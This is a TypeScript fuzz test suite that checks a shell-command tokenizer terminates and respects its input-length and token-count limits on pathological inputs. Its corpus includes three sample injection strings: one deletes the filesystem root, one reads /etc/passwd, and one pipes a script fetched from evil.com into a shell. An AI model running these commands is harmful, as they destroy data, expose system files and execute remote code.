/**
 * GC-PERM-010, Tokenizer fuzz and pathological-input guards.
 *
 * Test suite verifies that:
 *  1. MAX_INPUT_LENGTH truncation prevents the tokenizer from processing
 *     arbitrarily long inputs.
 *  2. MAX_TOKEN_COUNT bail-out prevents unbounded token lists.
 *  3. The tokenizer always terminates in bounded wall-clock time across
 *     a corpus of pathological inputs.
 *  4. Output token count never exceeds MAX_TOKEN_COUNT regardless of input.
 */

import { describe, expect, it } from 'bun:test';
import {
  MAX_INPUT_LENGTH,
  MAX_TOKEN_COUNT,
  tokenize,
} from '@/runtime/index.ts';

// ---------------------------------------------------------------------------
// Fuzz seed corpus, pathological inputs that commonly expose parser hangs
// ---------------------------------------------------------------------------

/** Each entry: [label, input] */
const FUZZ_CORPUS: Array<[string, string]> = [
  // --- Length extremes ---
  ['empty string', ''],
  ['single space', ' '],
  ['single char', 'a'],
  ['exactly at MAX_INPUT_LENGTH', 'a'.repeat(MAX_INPUT_LENGTH)],
  ['one over MAX_INPUT_LENGTH', 'a'.repeat(MAX_INPUT_LENGTH + 1)],
  ['10x MAX_INPUT_LENGTH', 'a'.repeat(MAX_INPUT_LENGTH * 10)],

  // --- Token count extremes ---
  ['MAX_TOKEN_COUNT single-char tokens', Array.from({ length: MAX_TOKEN_COUNT }, (_, i) => String.fromCharCode(97 + (i % 26))).join(' ')],
  ['double MAX_TOKEN_COUNT tokens', Array.from({ length: MAX_TOKEN_COUNT * 2 }, () => 'x').join(' ')],
  ['10x MAX_TOKEN_COUNT tokens', Array.from({ length: MAX_TOKEN_COUNT * 10 }, () => 'x').join(' ')],

  // --- Deeply nested/unclosed quotes ---
  ['unclosed single quote', "'"],
  ['unclosed double quote', '"'],
  ['unclosed quote long fill', "'" + 'a'.repeat(65_000)],
  ['unclosed double quote long fill', '"' + 'b'.repeat(65_000)],
  ['alternating unclosed quotes', "'\"'\"'\"'\"'\"'\"'\"'\"'\""],
  ['nested single-inside-double quote', '"outer \'inner\' end"'],
  ['nested double-inside-single quote', "'outer \"inner\" end'"],
  ['quotes with embedded newlines', "'line1\nline2\nline3'"],
  ['quotes alternating with operators', "'a' && 'b' || 'c' ; 'd'"],
  ['many short quoted strings', Array.from({ length: 512 }, () => "'x'").join(' ')],
  ['extremely long quoted string', `'${'a'.repeat(65_000)}'`],

  // --- Extreme repetition ---
  ['repeated &&', '&&'.repeat(32_768)],
  ['repeated ||', '||'.repeat(32_768)],
  ['repeated ;', ';'.repeat(65_536)],
  ['repeated |', '|'.repeat(65_536)],
  ['repeated >', '>'.repeat(65_536)],
  ['repeated <', '<'.repeat(65_536)],
  ['repeated >>', '>>'.repeat(32_768)],
  ['repeated 2>', '2>'.repeat(32_768)],
  ['alternating operators', '&& || ; | > >> < 2> '.repeat(4_096)],
  ['repeated word foo', 'foo '.repeat(32_768)],
  ['repeated flag -f', '-f '.repeat(32_768)],
  ['repeated path /a/b', '/a/b '.repeat(32_768)],
  ['repeated escape sequences', '\\ '.repeat(32_768)],

  // --- Unicode edge cases ---
  ['null bytes in string', 'cmd \0arg'],
  ['null byte only', '\0'],
  ['null bytes repeated', '\0'.repeat(65_536)],
  ['zero-width space', 'cmd \u200b arg'],
  ['right-to-left override', 'cmd \u202e arg'],
  ['combining characters', 'cmd \u0300\u0301\u0302 arg'],
  ['emoji tokens', 'cmd \uD83D\uDE00 arg'],
  ['high surrogate only', 'cmd \uD800 arg'],
  ['mixed ASCII and multibyte', 'ls /tmp/\u4e2d\u6587\u76ee\u5f55'],
  ['replacement character', 'cmd \uFFFD arg'],
  ['byte order mark prefix', '\uFEFFcmd arg'],
  ['private use area', 'cmd \uE000 arg'],
  ['non-breaking space', 'cmd\u00A0arg'],
  ['en-space between tokens', 'cmd\u2002arg'],
  ['mixed unicode whitespace', 'cmd\u2003\u2009\u200Aarg'],
  ['extremely long unicode token', '\u4e2d'.repeat(32_768)],

  // --- Backslash/escape edge cases ---
  ['trailing backslash', 'cmd arg\\'],
  ['backslash before quote', "cmd \\' arg"],
  ['double backslash', 'cmd arg\\\\ next'],
  ['backslash newline continuation', 'cmd arg\\\narg2'],
  ['backslash at end of long token', 'x'.repeat(64_000) + '\\'],

  // --- Operator boundary conditions ---
  ['operator at start', '&& cmd'],
  ['operator at end', 'cmd &&'],
  ['chained operators no commands', '&& || ; && ||'],
  ['redirect to empty', 'cmd >'],
  ['double redirect chain', 'cmd >> >> >> >>'],
  ['mixed 2> and >', 'cmd 2> /dev/null > /dev/null'],

  // --- Subshell edge cases ---
  ['unclosed $( subshell', 'cmd $(foo'],
  ['unclosed backtick subshell', 'cmd `foo'],
  ['nested subshell syntax', 'cmd $($(echo hi))'],
  ['subshell with operators inside', 'cmd $(echo a && echo b)'],
  ['backtick with newline inside', 'cmd `echo\nfoo`'],
  ['very long backtick subshell', 'cmd `' + 'a'.repeat(64_000) + '`'],

  // --- Mixed pathological ---
  ['long command with many flags', 'cmd ' + Array.from({ length: 500 }, (_, i) => `-flag${i}`).join(' ')],
  ['long path chain', Array.from({ length: 256 }, () => '/a/b/c/d').join(' ')],
  ['command injection attempt 1', 'cmd; rm -rf /'],
  ['command injection attempt 2', 'cmd && cat /etc/passwd'],
  ['command injection attempt 3', 'cmd || wget http://evil.com/shell.sh | sh'],
  ['variable expansion repetition', '$VAR '.repeat(16_384)],
  ['curly var expansion repetition', '${VAR} '.repeat(16_384)],
  ['whitespace only long', ' \t\n\r '.repeat(16_384)],
  ['alternating token and operator', 'a ; '.repeat(16_384)],
  ['very long single word (no spaces)', 'x'.repeat(MAX_INPUT_LENGTH)],
];

// ---------------------------------------------------------------------------
// Property: tokenizer always terminates (bounded wall-clock time)
// ---------------------------------------------------------------------------

/**
 * Maximum milliseconds allowed for any single tokenize() call.
 *
 * The property is termination: the failure this guards against is a tokenizer
 * that never comes back on a pathological input, not one that is a few hundred
 * milliseconds slower than usual. 500 ms was a number only an idle machine can
 * promise, a pathological input plus one descheduling crosses it while the
 * tokenizer is behaving perfectly. The bound is still far below any
 * non-terminating run.
 */
const MAX_ALLOWED_MS = 5_000;

describe('GC-PERM-010: tokenizer fuzz and pathological guards', () => {
  describe('property: always terminates within bounded time', () => {
    for (const [label, input] of FUZZ_CORPUS) {
      it(`terminates for: ${label}`, () => {
        const start = performance.now();
        tokenize(input);
        const elapsed = performance.now() - start;
        expect(elapsed).toBeLessThan(MAX_ALLOWED_MS);
      });
    }
  });

  describe('property: output token count never exceeds MAX_TOKEN_COUNT', () => {
    for (const [label, input] of FUZZ_CORPUS) {
      it(`token count bounded for: ${label}`, () => {
        const tokens = tokenize(input);
        expect(tokens.length).toBeLessThanOrEqual(MAX_TOKEN_COUNT);
      });
    }
  });

  // ---------------------------------------------------------------------------
  // Unit: MAX_INPUT_LENGTH guard
  // ---------------------------------------------------------------------------

  describe('MAX_INPUT_LENGTH guard', () => {
    it('processes input exactly at limit without error', () => {
      const input = 'x'.repeat(MAX_INPUT_LENGTH);
      expect(() => tokenize(input)).not.toThrow();
    });

    it('processes input one byte over limit without error', () => {
      const input = 'x'.repeat(MAX_INPUT_LENGTH + 1);
      expect(() => tokenize(input)).not.toThrow();
    });

    it('input exceeding MAX_INPUT_LENGTH produces same tokens as truncated input', () => {
      // A plain word longer than MAX_INPUT_LENGTH gets truncated to the limit,
      // so tokenize(long) should equal tokenize(long.slice(0, MAX_INPUT_LENGTH)).
      const base = 'abc '.repeat(MAX_INPUT_LENGTH);
      const truncated = base.slice(0, MAX_INPUT_LENGTH);
      const tokensLong = tokenize(base);
      const tokensTrunc = tokenize(truncated);
      expect(tokensLong).toEqual(tokensTrunc);
    });

    it('very long input terminates quickly', () => {
      const input = 'a '.repeat(MAX_INPUT_LENGTH * 5);
      const start = performance.now();
      tokenize(input);
      expect(performance.now() - start).toBeLessThan(MAX_ALLOWED_MS);
    });
  });

  // ---------------------------------------------------------------------------
  // Unit: MAX_TOKEN_COUNT guard
  // ---------------------------------------------------------------------------

  describe('MAX_TOKEN_COUNT guard', () => {
    it('stops at exactly MAX_TOKEN_COUNT tokens', () => {
      // Each 'x ' produces one 'argument' token; generate many more than the limit.
      const input = 'x '.repeat(MAX_TOKEN_COUNT * 2);
      const tokens = tokenize(input);
      expect(tokens.length).toBe(MAX_TOKEN_COUNT);
    });

    it('returns a valid partial token list when limit is hit', () => {
      const input = 'tok '.repeat(MAX_TOKEN_COUNT * 3);
      const tokens = tokenize(input);
      // Every token must have a non-empty value and a valid type
      for (const tok of tokens) {
        expect(tok.value.length).toBeGreaterThan(0);
        expect([
          'command', 'argument', 'flag', 'operator',
          'path', 'redirect', 'pipe', 'subshell',
        ]).toContain(tok.type);
        expect(typeof tok.position).toBe('number');
        expect(tok.position).toBeGreaterThanOrEqual(0);
      }
    });

    it('operator-heavy input respects token limit', () => {
      // Each '; ' produces one operator token, should still cap at MAX_TOKEN_COUNT.
      const input = '; '.repeat(MAX_TOKEN_COUNT * 2);
      const tokens = tokenize(input);
      expect(tokens.length).toBeLessThanOrEqual(MAX_TOKEN_COUNT);
    });

    it('quoted-token-heavy input respects token limit', () => {
      const input = "'x' ".repeat(MAX_TOKEN_COUNT * 2);
      const tokens = tokenize(input);
      expect(tokens.length).toBeLessThanOrEqual(MAX_TOKEN_COUNT);
    });

    it('mixed operator and word tokens respect limit', () => {
      // Alternate 'word && ', each pair is 2 tokens.
      const input = 'word && '.repeat(MAX_TOKEN_COUNT);
      const tokens = tokenize(input);
      expect(tokens.length).toBeLessThanOrEqual(MAX_TOKEN_COUNT);
    });
  });

  // ---------------------------------------------------------------------------
  // Unit: normal inputs are unaffected by guards
  // ---------------------------------------------------------------------------

  describe('normal inputs unaffected by guards', () => {
    it('simple command tokenizes correctly', () => {
      const tokens = tokenize('ls -la /tmp');
      expect(tokens).toHaveLength(3);
      expect(tokens[0]).toMatchObject({ value: 'ls', type: 'command' });
      expect(tokens[1]).toMatchObject({ value: '-la', type: 'flag' });
      expect(tokens[2]).toMatchObject({ value: '/tmp', type: 'path' });
    });

    it('compound command tokenizes correctly', () => {
      const tokens = tokenize('echo hi && ls');
      expect(tokens).toHaveLength(4);
      expect(tokens[2]).toMatchObject({ value: '&&', type: 'operator' });
      expect(tokens[3]).toMatchObject({ value: 'ls', type: 'command' });
    });

    it('quoted argument preserved', () => {
      const tokens = tokenize('echo "hello world"');
      expect(tokens).toHaveLength(2);
      expect(tokens[1]).toMatchObject({ value: '"hello world"', type: 'argument' });
    });

    it('empty string returns empty array', () => {
      expect(tokenize('')).toEqual([]);
    });

    it('whitespace-only string returns empty array', () => {
      expect(tokenize('   \t\n  ')).toEqual([]);
    });
  });

  // ---------------------------------------------------------------------------
  // Rollback: emergency hard-cut length fallback is always the last resort
  // The following test verifies the fallback is correct regardless of
  // internal tokenizer state.
  // ---------------------------------------------------------------------------

  describe('emergency fallback: length truncation is always applied first', () => {
    it('null bytes inside long input do not cause hang', () => {
      const input = '\0'.repeat(MAX_INPUT_LENGTH * 3);
      const start = performance.now();
      const tokens = tokenize(input);
      expect(performance.now() - start).toBeLessThan(MAX_ALLOWED_MS);
      expect(tokens.length).toBeLessThanOrEqual(MAX_TOKEN_COUNT);
    });

    it('unicode storm inside long input does not cause hang', () => {
      // Mixing multibyte chars and operators forces many branch paths.
      const chunk = '\u4e2d\u6587 && \u0041 ; ';
      const input = chunk.repeat(Math.ceil((MAX_INPUT_LENGTH * 2) / chunk.length));
      const start = performance.now();
      const tokens = tokenize(input);
      expect(performance.now() - start).toBeLessThan(MAX_ALLOWED_MS);
      expect(tokens.length).toBeLessThanOrEqual(MAX_TOKEN_COUNT);
    });

    it('repeated escape sequences inside long input do not cause hang', () => {
      const input = '\\ '.repeat(MAX_INPUT_LENGTH);
      const start = performance.now();
      const tokens = tokenize(input);
      expect(performance.now() - start).toBeLessThan(MAX_ALLOWED_MS);
      expect(tokens.length).toBeLessThanOrEqual(MAX_TOKEN_COUNT);
    });
  });
});
